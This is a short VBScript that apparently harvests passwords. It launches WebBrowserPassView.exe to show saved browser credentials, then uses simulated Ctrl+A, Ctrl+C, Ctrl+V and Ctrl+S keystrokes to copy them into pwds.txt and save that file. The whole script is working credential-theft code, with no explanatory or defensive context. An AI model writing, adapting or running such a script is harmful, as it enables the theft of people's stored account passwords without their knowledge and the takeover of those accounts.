set x=createobject("wscript.shell")
x.run "WebBrowserPassView.exe"
wscript.sleep 4000
x.sendkeys "^(a)"
x.sendkeys "^(c)"
x.run "pwds.txt"
wscript.sleep 1000
x.sendkeys "^(v)"
x.sendkeys "^(s)"

